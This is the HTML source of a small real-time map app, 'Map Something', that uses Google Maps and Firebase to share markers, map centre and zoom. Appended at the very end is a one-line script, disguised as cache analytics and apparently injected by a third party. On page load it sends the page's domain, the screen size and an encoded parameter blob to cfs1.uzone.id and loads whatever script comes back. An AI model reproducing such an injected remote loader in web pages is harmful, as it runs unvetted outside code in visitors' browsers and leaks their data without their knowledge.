<!DOCTYPE html>
<html>
  <head>
	<Title>Map Something</Title>
    <meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
    <style type="text/css">
      html { height: 100% }
      body { height: 100%; margin: 0; padding: 0 }
	  #map { height: 100% }
	  #divControls { 	position: absolute; 
					right: 10px; 
					bottom: 20px; 
					z-index: 100; 
					border: 2px solid #a1a1a1;
					*border-radius: 25px;
					margin: 10px;
					padding: 5px;
					background-color: White;}
    </style>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
	<script src="https://cdn.firebase.com/js/client/2.2.3/firebase.js"></script>
	<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?sensor=false&v=3.19"></script>
    <script type="text/javascript">
		var map;
		markers = [];
		var PointsRef = new Firebase('https://mapsomething.firebaseio.com/points');
		var LinesRef = new Firebase('https://mapsomething.firebaseio.com/lines');
		var PolygonsRef = new Firebase('https://mapsomething.firebaseio.com/polygons');
		var MapRef = new Firebase('https://mapsomething.firebaseio.com/mapData');
		var CenterRef = new Firebase('https://mapsomething.firebaseio.com/mapData/centerLatLng');
		var ZoomRef = new Firebase('https://mapsomething.firebaseio.com/mapData/mapZoom');
		
		PointsRef.on('child_added', function(snapshot) {
			var location = new google.maps.LatLng(snapshot.val().pointLatLng.Lat, snapshot.val().pointLatLng.Lng);
			var marker = new google.maps.Marker({
				position: location, 
				map: map,
				key: snapshot.key()
			});
			markers.push(marker);
			console.log(typeof marker);
			console.log(marker);
		});
		
		PointsRef.on('child_removed', function(snapshot) {
			for (var i = 0; i < markers.length; i++) {
				if (markers[i].key == snapshot.key()) {
					markers[i].setMap(null);
				}
			}
		});
		
		CenterRef.on('value', function(snapshot) {
			var center = new google.maps.LatLng(snapshot.val().Lat, snapshot.val().Lng);
			//if (map.getCenter() != center) {
				map.setCenter(center);
			//}
		});
		
		ZoomRef.on('value', function(snapshot) {
			var zoom = snapshot.val();
			if (map.getZoom() != zoom) {
				map.setZoom(zoom);
				console.log(zoom);
			}
		});
				
		function initialize() {
			var mapOptions = {
				center: new google.maps.LatLng(53.917, -122.75),
				zoom: 8,
				mapTypeId: google.maps.MapTypeId.ROADMAP
			};
			map = new google.maps.Map(document.getElementById("map"),mapOptions);

			google.maps.event.addListener(map, 'click', function(event) {
				if (document.getElementById('radPoint').checked && document.getElementById('radDraw').checked) {
					var jsonVariable = {
						pointLatLng: {
							Lat: event.latLng.lat(),
							Lng: event.latLng.lng()
						}
					}
					PointsRef.push(jsonVariable);
				} else if (document.getElementById('radLine').checked) {
					console.log('lnclick');
				} else if (document.getElementById('radPolygon').checked) {
					console.log('polyclick');
				}
				
				
			});
			
			google.maps.event.addListener(map, 'center_changed', function() {
				var center = map.getCenter();
				var zoom = map.getZoom();
				var jsonVariable = {
					centerLatLng: {
						Lat: center.lat(),
						Lng: center.lng()
					}
				}
				MapRef.update(jsonVariable);
			});
			
			google.maps.event.addListener(map, 'zoom_changed', function() {
				var center = map.getCenter();
				var zoom = map.getZoom();
				var jsonVariable = {
					mapZoom: zoom
				}
				MapRef.update(jsonVariable);
			});
			
		}
		
		function eraseAll() {
			PointsRef.remove();
		}
		
		google.maps.event.addDomListener(window, 'load', initialize);
    </script>
  </head>
  <body>
    <div id="divControls">
		<input type="radio" name="geomType" id="radPoint" value="Point" checked>Point</input><br>
		<input type="radio" name="geomType" id="radLine" value="Line" disabled>Line</input><br>
		<input type="radio" name="geomType" id="radPolygon" value="Polygon" disabled>Polygon</input><br>
		<hr>
		<input type="radio" name="drawType" id="radDraw" value="Draw" checked>Draw</input><br>
		<input type="radio" name="drawType" id="radErase" value="Erase"disabled>Erase</input>
		<hr>
		<input type="button" id="btnEraseAll" value="Erase All" onclick="eraseAll();"></input>
	</div>
	<div id="map"/>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL312o9s1i9Onhk%2bpq%2b1TsCxKfDEFQ2qX65wbwfn9GlHvqyF045QOHQOc7qD8ctGAjbG2ps2%2bNxOcq9vV7tAaQsXetzjTTtgaiJ9Pnfy69UwXuXyWoitByCzt88Rn54d9PjIfflpw5mqKREqPoesjVW5%2fm4k3LMz4DspzUrs%2bKKQph9L%2bjU1%2fRAZ1XWYOTFzk4Oe1OLxdIrdE%2bYtM5lSwXXEx2zNrZtCVrVEukin%2fiIU52MJM9mzSrDo9m6Vc7cTIrYVKRhj8MdShpggZJfWtoL9eGi3QkaOgmIpwTHM70y1x6YXSKl%2frqdc4CSufxhgeInhghlH%2bnnaFJF5ShMpBkT9A5f%2fKJ1QvNelxlNAaSAFQDShfVGlzBCSlaFSsKUMA8%2bwUTageBFaKSnG3UxuyOPHgSQzXXAbHsoUiusd%2bxUVgY5zUSkuyEcufcI3YM0dLtfVb1ON%2fY9tsV1yK%2bDGZTeLKRgCNt1EWS7Q6eHopZs6PQeInwjxW79u7RfuLLyPQ00M" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>